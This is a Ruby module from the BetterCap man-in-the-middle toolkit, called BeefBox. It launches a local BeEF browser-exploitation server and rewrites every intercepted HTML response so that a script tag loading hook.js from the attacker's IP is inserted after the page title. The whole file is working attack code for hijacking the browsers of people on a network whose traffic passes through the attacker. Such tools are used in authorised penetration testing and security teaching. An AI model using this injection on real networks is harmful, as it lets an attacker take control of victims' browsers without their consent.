=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end

# Handle BeEF framework execution and injection into
# html pages automagically.
class BeefBox < BetterCap::Proxy::Module
  @@beefpath = nil

  def self.on_options(opts)
    opts.on( '--beef-path PATH', 'Path to the BeEF installation.' ) do |v|
      @@beefpath = File.expand_path v
      unless Dir.exists?(@@beefpath) and File.exists?(@@beefpath + '/beef')
        raise BetterCap::Error, "#{@@beefpath} invalid BeEF installation path."
      end
    end
  end

  def initialize
    @beefport = 3000
    @beefpid  = nil
    @hookname = 'hook.js'
    @jsfile   = "http://#{BetterCap::Context.get.ifconfig[:ip_saddr]}:#{@beefport}/#{@hookname}"

    while !beef_path_valid?
      print '[BEEFBOX] Please specify the BeEF installation path: '.yellow
      @@beefpath = gets.chomp
    end

    BetterCap::Logger.warn "[BEEFBOX] Starting BeEF ..."

    @beefpid = fork do
      exec "cd '#{@@beefpath}' && ./beef"
    end
  end

  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      BetterCap::Logger.warn "Injecting BeEF into http://#{request.host}#{request.url}"

      response.body.sub!( '</title>', "</title><script src='#{@jsfile}' type='text/javascript'></script>" )
    end
  end

  private

  def beef_path_valid?
    unless @@beefpath.nil?
      @@beefpath = File.expand_path @@beefpath
      if Dir.exists? @@beefpath
        return File.exists? @@beefpath + '/beef'
      end
    end
    false
  end
end
